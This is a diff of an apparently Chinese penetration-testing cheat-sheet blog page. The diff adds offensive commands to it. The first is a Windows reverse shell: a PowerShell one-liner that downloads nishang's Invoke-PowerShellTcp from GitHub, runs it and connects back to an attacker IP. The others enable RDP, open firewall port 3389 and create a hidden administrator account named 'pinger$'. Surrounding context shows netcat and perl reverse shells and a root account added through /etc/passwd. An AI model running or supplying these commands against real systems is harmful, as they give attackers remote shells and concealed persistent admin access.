@@ -50,7 +50,7 @@
 
 <meta itemprop="datePublished" content="2021-01-01T21:28:36&#43;08:00" />
 <meta itemprop="dateModified" content="2021-01-01T21:28:36&#43;08:00" />
-<meta itemprop="wordCount" content="832">
+<meta itemprop="wordCount" content="1021">
 
 
 
@@ -131,8 +131,8 @@
         <div class="post-category">
             <a href="/categories/security/"> security </a>
             </div>
-          <span class="more-meta"> 约 832 字 </span>
-          <span class="more-meta"> 预计阅读 2 分钟 </span>
+          <span class="more-meta"> 约 1021 字 </span>
+          <span class="more-meta"> 预计阅读 3 分钟 </span>
         <span id="busuanzi_container_page_pv" class="more-meta"> <span id="busuanzi_value_page_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次阅读 </span>
       </div>
     </header>
@@ -157,6 +157,8 @@
 <ul>
 <li><a href="#端口敲门">端口敲门</a></li>
 <li><a href="#利用-etc-passwd-提权">利用 <code>/etc/passwd</code> 提权</a></li>
+<li><a href="#开启windows-rdp">开启windows rdp</a></li>
+<li><a href="#添加简单影子用户">添加简单影子用户</a></li>
 </ul></li>
 </ul></li>
 </ul>
@@ -218,6 +220,12 @@ perl -e &#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=1234;socket(S,PF_INET,SOCK_STRE
 <p>攻击机： <code>nc -lvnp 7777</code></p>
 
 <p>靶机： <code>nc [ip] 7777 -e /bin/bash</code></p>
+
+<p>（3）windows反弹shell</p>
+
+<p>攻击机： <code>nc -lvnp 7777</code></p>
+
+<p>靶机： <code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp  -Reverse -IPAddress [ip] -Port 9999&quot;</code></p>
 
 <h2 id="提权">提权</h2>
 
@@ -324,6 +332,27 @@ knockd 192.168.189.10 7469 8475 9842</pre></td></tr></table>
 <td class="lntd">
 <pre class="chroma">echo &#34;p1n93r:xxxx:0:0:root:/root:/bin/bash&#34;
 su p1n93r</pre></td></tr></table>
+</div>
+</div>
+<h3 id="开启windows-rdp">开启windows rdp</h3>
+
+<ul>
+<li>设置远程桌面端口：reg add &ldquo;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&rdquo; /t REG_DWORD /v portnumber /d 3389 /f</li>
+<li>开启远程桌面：wmic RDTOGGLE WHERE ServerName=&lsquo;%COMPUTERNAME%&rsquo; call SetAllowTSConnections 1</li>
+<li>检查端口状态：netstat -an|find &ldquo;3389&rdquo;</li>
+<li>关闭远程桌面：wmic RDTOGGLE WHERE ServerName=&lsquo;%COMPUTERNAME%&rsquo; call SetAllowTSConnections 0</li>
+<li>防火墙放行3389端口：netsh advfirewall firewall add rule name=&ldquo;无所谓&rdquo; dir=in protocol=tcp localport=3389 action=allow</li>
+</ul>
+
+<h3 id="添加简单影子用户">添加简单影子用户</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">net user pinger$ Pingerp1n93r /add
+net localgroup administrators pinger$ /add </pre></td></tr></table>
 </div>
 </div>
     </div>
